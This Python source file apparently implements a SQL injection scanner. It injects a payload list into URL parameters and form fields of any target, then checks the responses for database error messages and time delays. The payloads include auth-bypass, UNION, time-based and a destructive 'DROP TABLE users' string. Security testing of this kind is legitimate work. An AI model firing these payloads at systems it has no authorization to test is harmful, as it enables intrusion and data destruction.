#  Copyright (c) 2025. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
#  Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
#  Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
#  Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
#  Vestibulum commodo. Ut rhoncus gravida arcu.
#  author:lwl
#  Collaborator:cr and lx and tyf


import requests
from bs4 import BeautifulSoup
import re

def detect_sql_injection(url):
    try:
        # SQL注入测试payload
        payloads = [
            "' OR '1'='1'-- ",
            "' OR 1=1-- ",
            '" OR "1"="1"-- ',
            "' OR SLEEP(5)-- ",
            "'; DROP TABLE users-- ",
            "1' ORDER BY 1-- ",
            "1' UNION SELECT null, version()-- ",
            "' AND 1=CONVERT(int, (SELECT @@version))-- "
        ]

        vulnerabilities = []
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"Unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"ODBC SQL Server Driver",
            r"Microsoft OLE DB Provider for SQL Server",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"SQLite.Exception",
            r"Microsoft Access Driver",
            r"Syntax error.*in query expression"
        ]

        # 测试GET参数
        parsed_url = requests.compat.urlparse(url)
        query = parsed_url.query

        if query:
            # 测试每个参数
            for param in re.split(r'[&;]', query):
                if '=' in param:
                    key, value = param.split('=', 1)
                    for payload in payloads:
                        test_url = url.replace(f"{key}={value}", f"{key}={value}{payload}")
                        try:
                            response = requests.get(test_url, timeout=10)

                            # 检查错误信息
                            for pattern in error_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vulnerabilities.append(f"SQL注入 (GET参数): {key}={payload}")
                                    break

                            # 检查时间延迟
                            if "SLEEP" in payload and response.elapsed.total_seconds() > 4:
                                vulnerabilities.append(f"基于时间的SQL注入: {key}={payload}")

                        except Exception as e:
                            continue

        # 测试表单
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            form_action = form.get('action')
            form_method = form.get('method', 'get').lower()

            inputs = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                input_type = input_tag.get('type', 'text').lower()
                if name and input_type in ['text', 'hidden', 'search', 'email', 'password']:
                    inputs[name] = payloads[0]  # 使用第一个payload测试

            if form_action and inputs:
                target_url = requests.compat.urljoin(url, form_action)

                try:
                    if form_method == 'post':
                        res = requests.post(target_url, data=inputs, timeout=15)
                    else:
                        res = requests.get(target_url, params=inputs, timeout=15)

                    # 检查错误信息
                    for pattern in error_patterns:
                        if re.search(pattern, res.text, re.IGNORECASE):
                            vulnerabilities.append(f"SQL注入 (表单): {list(inputs.keys())[0]}={payloads[0]}")
                            break

                except Exception as e:
                    continue

        if vulnerabilities:
            return "发现SQL注入漏洞:\n" + "\n".join(vulnerabilities)
        return "未发现SQL注入漏洞"

    except Exception as e:
        return f"检测失败: {str(e)}"